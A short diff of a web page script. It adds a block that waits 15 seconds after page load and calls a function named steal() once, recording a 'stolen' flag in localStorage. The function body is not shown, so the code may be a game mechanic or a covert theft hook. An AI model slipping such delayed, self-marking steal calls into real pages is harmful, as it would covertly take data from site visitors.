@@ -8,6 +8,11 @@ document.addEventListener("DOMContentLoaded", function() {
   Cheese.classList.add("note");
   console.log("Someone has been here before")
   }
+  sleep(15000).then(() => {
+    if (!localStorage.getItem("stolen")){
+      steal()
+    }
+  });
 });
 
 function sleep(ms) {
